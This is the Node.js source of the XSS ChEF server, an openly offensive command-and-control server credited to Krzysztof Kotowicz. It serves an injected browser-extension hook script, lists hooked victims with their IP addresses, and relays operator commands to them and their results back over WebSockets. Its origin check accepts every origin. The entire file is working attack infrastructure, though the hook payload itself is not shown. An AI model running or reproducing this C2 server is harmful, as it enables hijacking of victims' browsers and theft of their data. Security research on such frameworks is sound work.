#!/usr/bin/env node
/*
node.js based CheF server supporting WebSockets communication
*/
var WebSocketServer = require('websocket').server;
var http = require('http');
var fs = require('fs');
var static = require('node-static');

var fileserver = new(static.Server)('.');

//var https = require('https');
//var privateKey = fs.readFileSync('privatekey.pem').toString();
//var certificate = fs.readFileSync('certificate.pem').toString();
//var options = {key: privateKey, cert: certificate};

var hookFile = fs.readFileSync('xsschef.js').toString();

var hookHeaders = {
    'Content-Type': 'text/javascript',
    'Expires': 'Sat, 26 Jul 1997 05:00:00 GMT',
    'Last-Modified': 'Sat, 26 Jul 2100 05:00:00 GMT',
    'Cache-Control': 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'Pragma':'no-cache'
}

var prepareHook = function(req) {
    var channel = 'c'+Math.floor(Math.random()*1000000);
    var ws_url = 'ws://'+req.headers.host + '/';
    
    var modified = hookFile.replace(/__URL__/g, ws_url)
                    .replace(/__CHANNEL__/g, channel)
                    .replace(/__CMD_CHANNEL__/g, channel + '-cmd');
    return modified;
    
}
var server = http.createServer(function(request, response) {
    console.log((new Date()) + ' Received request for ' + request.url);
    if (request.url == '/hook.php' || request.url == '/hook') { // hook
        response.writeHead(200, hookHeaders);
        response.end(prepareHook(request));
        return;
    }
    
    if (request.url == '/list') { // console
        var hooks = [];
        connections.forEach(function(c) {
            if (c.isHook) 
                hooks.push({ch: c.channel, ip: c.remoteAddress, lastActive: c.lastActive});
        });
        response.writeHead(200, {'content-type' : 'application/json'});
        response.end(JSON.stringify(hooks));
        return;
    }
    
    if (request.url == '/') {
        request.url = '/console.html'; // quietly serve console.html (no redirect)
    }
    
    fileserver.serve(request, response);
    //response.writeHead(404);
    //response.end();
});

var commandStorage = {}
var resultStorage = {};
var connections = [];
var args = process.argv.splice(2);
var port = args[0];
if (!port) {
    port = 8080;
}
console.log("XSS ChEF server");
console.log("by Krzysztof Kotowicz");
console.log("");
console.log("Usage: node server.js [port]");
server.listen(port, function() {
    console.log((new Date()) + 'ChEF server is listening on port ' + port);
});

wsServer = new WebSocketServer({
    httpServer: server,
    // You should not use autoAcceptConnections for production
    // applications, as it defeats all standard cross-origin protection
    // facilities built into the protocol and the browser.  You should
    // *always* verify the connection's origin and decide whether or not
    // to accept it.
    autoAcceptConnections: false,
    maxReceivedFrameSize: 1024*1024*10, // 10 MB max
    maxReceivedMessageSize: 1024*1024*10
    //disableNagleAlgorithm: false
});

function originIsAllowed(origin) {
  // put logic here to detect whether the specified origin is allowed.
  return true;
}

function push(channel, flagName, container) {
	var sent = false;
    connections.forEach(function(c) {
    	if (sent) { 
			return;
		}
        if (c[flagName] && c.channel == channel) {
           var toSend = container[channel];
           if (toSend) {
                delete container[channel];
                c.sendUTF(JSON.stringify(toSend));
                sent = true;
           }
           
        }
    }); 
}

function pushToc2c(channel) {
    return push(channel, 'isC2C', resultStorage);
}

function pushToHook(channel) {
    return push(channel, 'isHook', commandStorage);
}

wsServer.on('request', function(request) {
    if (!originIsAllowed(request.origin) || request.requestedProtocols.indexOf('chef') == -1) {
      // Make sure we only accept requests from an allowed origin
      request.reject();
      console.log((new Date()) + ' Connection from origin ' + request.origin + ' rejected.');
      return;
    }

    var connection = request.accept('chef', request.origin);
    if (connection) {
        connections.push(connection);
    }
    
    console.log((new Date()) + ' WebSocket connection accepted.');
    connection.on('message', function(message) {

        if (message.type !== 'utf8') {
            console.log("Non utf8 format, dropping");
            return;
        }
        
        var payload;
        
        try {
            payload = JSON.parse(message.utf8Data);
            connection.lastActive = new Date();
            switch (payload.cmd) {
                case 'hello-c2c':
                    connection.isHook = false;
                    connection.isC2C = true;
                break;
                case 'set-channel':
                    if (!connection.isC2C) {
                        throw "Only c2c can set-channel"
                    }
                    connection.channel = payload.ch;
                    pushToc2c(connection.channel);
                break;
                case 'hello-hook':
                    connection.isHook = true;
                    connection.isC2C = false;
                    connection.channel = payload.ch;
                    console.log('New hook ' + connection.channel + ' from ' + connection.remoteAddress);
                    pushToHook(connection.channel);
                    connections.forEach(function(c) {
                        if (c.isC2C) {
                            c.sendUTF(JSON.stringify([[{type:'server_msg', result: 'New hook: '+ payload.ch + ' - ' + connection.remoteAddress}]]));
                        }
                    });
                    
                break;
                case 'command': // from c&c to hook
                    if (!connection.isC2C) {
                       throw "Not authorized to send commands";
                    }
                    if (!connection.channel) {
                        throw "No channel set in connection (command)";
                    }
                    if (!commandStorage[connection.channel]) {
                        commandStorage[connection.channel] = [];
                    }
                    commandStorage[connection.channel].push(payload.p);
                    pushToHook(connection.channel);
                break;
                case 'post': // from hook back to c&c 
                    if (!connection.channel) {
                        throw "No channel set in connection (post)";
                    }
                    
                    if (!resultStorage[connection.channel]) {
                        resultStorage[connection.channel] = [];
                    }
                    resultStorage[connection.channel].push(payload.p);
                    pushToc2c(connection.channel);
                break;
                case 'delete':
                    if (connection.isC2C) {
                        resultStorage = {}
                        commandStorage = {}
                    }
                break;
                default:
                    throw 'Unknown command ' + payload.cmd;
            }
        } catch (e) {
            console.log(e);
            return;
        } 
    });

    connection.on('close', function(reasonCode, description) {
        console.log((new Date()) + ' Peer ' + connection.remoteAddress + ' disconnected - ' + reasonCode + ' ' + description);

        var index = connections.indexOf(connection);
        if (index !== -1) {
            // remove the connection from the pool
            connections.splice(index, 1);
        }
        connections.forEach(function(c) {
            if (c.isC2C) {
                c.sendUTF(JSON.stringify([[{type:'server_msg', result: 'Hook '+ connection.channel + ' - ' + connection.remoteAddress + ' disconnected.'}]]));
            }
        });
    });
});
